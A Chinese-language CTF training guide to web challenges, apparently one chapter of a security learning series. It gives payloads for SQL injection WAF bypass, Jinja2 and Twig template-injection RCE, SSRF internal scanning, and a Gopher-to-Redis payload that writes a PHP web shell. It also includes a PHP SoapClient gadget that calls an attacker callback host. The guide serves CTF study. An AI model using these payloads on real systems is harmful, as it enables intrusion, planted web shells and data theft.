# CTF Web 题型与解题思路

> Web 是 CTF 中出场率最高、最贴近实战的题型，覆盖 OWASP Top 10 中的大部分漏洞。

---

## 常见题型速查表

| 题型 | 难度 | 解题要点 | 推荐工具 |
|------|------|---------|---------|
| SQL 注入 | ⭐⭐ | 闭合/绕过/盲注 | sqlmap+Burp |
| SSTI | ⭐⭐⭐ | 模板引擎识别 | tplmap |
| SSRF | ⭐⭐⭐ | 内网探测/协议跳转 | Gopherus |
| 反序列化 | ⭐⭐⭐⭐ | gadget chain | ysoserial/phpggc |
| 命令执行 | ⭐⭐ | 绕过过滤 | 手动+Burp Intruder |
| 文件上传 | ⭐⭐⭐ | 绕过校验/解析漏洞 | Burp Repeater |
| JWT 伪造 | ⭐⭐⭐ | 算法混淆/爆破 | jwt_tool |
| XSS + CSRF | ⭐⭐ | 配合利用 | XSS Platform |
| Node.js 原型链 | ⭐⭐⭐⭐ | __proto__ | 手动调试 |
| GraphQL 注入 | ⭐⭐⭐ | introspection | GraphQL Voyager |

## Web 题型精讲

### 1. SQL 注入绕过技巧

```sql
-- 关键字绕过（WAF）
/**/UN/**/ION/**/SE/**/LECT/**/ 1,2,3
UNION ALL SELECT 1,2,3
%55%4e%49%4f%4e%20%53%45%4c%45%43%54  # URL 编码

-- 空格绕过
UNION/**/SELECT/**/1,2,3
UNION%0aSELECT%0a1,2,3
SELECT\x0a1,2,3

-- 等号绕过
SELECT * FROM users WHERE id = 1
SELECT * FROM users WHERE id LIKE 1
SELECT * FROM users WHERE id IN (1)
```

### 2. SSTI 模板注入识别

```python
# 测试表达式（各模板引擎通用）
{{7*7}}       # 返回49 → Jinja2/Twig
${7*7}        # 返回49 → FreeMarker
#{7*7}        # 返回49 → Velocity
*{7*7}         # 返回49 → Struts2

# Python Jinja2 → RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Twig → RCE（PHP）
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("cat /flag") }}
```

### 3. SSRF 内网探测

```python
import requests

# 探测内网存活主机
for i in range(1, 255):
    url = f"http://target/?url=http://10.0.0.{i}:80"
    try:
        r = requests.get(url, timeout=2)
        if r.status_code != 500 and len(r.text) > 100:
            print(f"[+] 10.0.0.{i} 存活")
    except:
        pass

# 利用 Gopher 攻击 Redis
import urllib.parse

gopher = """
gopher://127.0.0.1:6379/_*3
$3
SET
$4
shell
$52
<?php system($_GET['cmd']); ?>
*4
$6
config
$3
set
$3
dir
$13
/var/www/html
*4
$6
config
$3
set
$10
dbfilename
$9
shell.php
*1
$4
save
""".replace("\n", "\r\n")

encoded = urllib.parse.quote(gopher)
```

### 4. PHP 反序列化

```php
// 常见 gadget chain：ThinkPHP/Laravel/原生类
// PHP 原生类利用
// GlobIterator — 目录遍历
$a = new SplFileObject('../../../flag.txt');

// SoapClient — SSRF
$client = new SoapClient(null, [
    'location' => 'http://attacker/callback',
    'uri' => 'http://test/'
]);
```

## 真题解析框架

拿到一道 Web 题时按这个流程走：

```
1. 信息收集
   ├─ 查看页面源码（注释、隐藏字段）
   ├─ 查看 HTTP 响应头
   ├─ 扫描目录（dirsearch/gobuster）
   ├─ 检查 robots.txt / sitemap.xml
   └─ 查看 Cookie/Session 中隐藏参数

2. 入口识别
   ├─ 参数传递点（GET/POST）
   ├─ 文件上传点
   ├─ API 接口（/api/ /graphql /swagger）
   └─ WebSocket 连接

3. 漏洞确认
   ├─ 尝试已知 Payload
   ├─ 查看报错信息（debug 开启？）
   ├─ 时间延迟判断（盲注/SSRF）
   └─ 对比正常/异常响应

4. 利用提权
   ├─ 从回显漏洞获取 flag
   ├─ 盲注逐字符提取
   ├─ SSRF → 云元数据/内网
   └─ RCE → 反弹 shell
```

## 推荐训练平台

| 平台 | 特点 | 网址 |
|------|------|------|
| **CTFHub** | 中文、题型分类清晰 | [ctfhub.com](https://www.ctfhub.com/) |
| **BugKu** | 中文综合平台 | [bugku.com](https://ctf.bugku.com/) |
| **JarvisOJ** | CTF 题库 | [jarvisoj.com](https://www.jarvisoj.com/) |
| **Root-Me** | 国际精品 | [root-me.org](https://www.root-me.org/) |
| **TryHackMe** | 交互式学习 | [tryhackme.com](https://tryhackme.com/) |
| **HackTheBox** | 专业渗透 | [hackthebox.com](https://www.hackthebox.com/) |
| **PicoCTF** | 新手友好 | [picoctf.com](https://picoctf.com/) |

*上一篇：[安全社区、公众号与深度资源](02-community-resources.md)*

*下一篇：[CTF PWN 与二进制安全](04-ctf-pwn.md)*
